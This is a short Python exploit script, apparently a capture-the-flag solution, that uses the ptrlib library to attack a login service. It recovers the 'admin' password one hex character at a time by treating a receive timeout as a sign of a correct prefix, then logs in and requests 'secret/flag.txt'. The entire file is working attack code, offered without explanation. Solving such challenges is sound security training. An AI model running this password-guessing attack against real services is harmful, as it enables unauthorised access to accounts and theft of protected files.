from ptrlib import *
from tqdm import tqdm
import os

logger.level = 0
HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "10021"))

password = ""

while True:
    for c in tqdm("0123456789abcdef"):
        sock = Socket(HOST, PORT)
        sock.sendlineafter(": ", "admin")
        sock.sendafter(": ", password + c)
        try:
            sock.recvline(timeout=1)
        except TimeoutError:
            password += c
            print(f"Searching: {password}")
            break
        finally:
            sock.close()
    else:
        break

sock = Socket(HOST, PORT)
sock.sendlineafter(": ", "admin")
sock.sendlineafter(": ", password)
sock.sendlineafter("File: ", "secret/flag.txt")
print(sock.recvline())
sock.close()
